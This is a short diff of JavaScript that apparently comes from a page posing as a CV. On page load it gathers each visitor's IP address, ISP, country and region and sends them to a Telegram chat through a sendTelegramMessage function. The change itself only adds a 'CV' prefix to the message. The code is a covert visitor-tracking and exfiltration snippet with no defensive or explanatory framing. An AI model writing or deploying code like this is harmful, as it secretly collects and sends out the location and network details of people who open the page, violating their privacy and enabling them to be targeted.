@@ -6,7 +6,7 @@ window.onload = function() {
             var isp = data.org;
             var country = data.country_name;
             var city = data.region;
-            var message = `IP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}`;
+            var message = `CV%0AIP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}`;
             sendTelegramMessage(message);
         })
         .catch(error => {
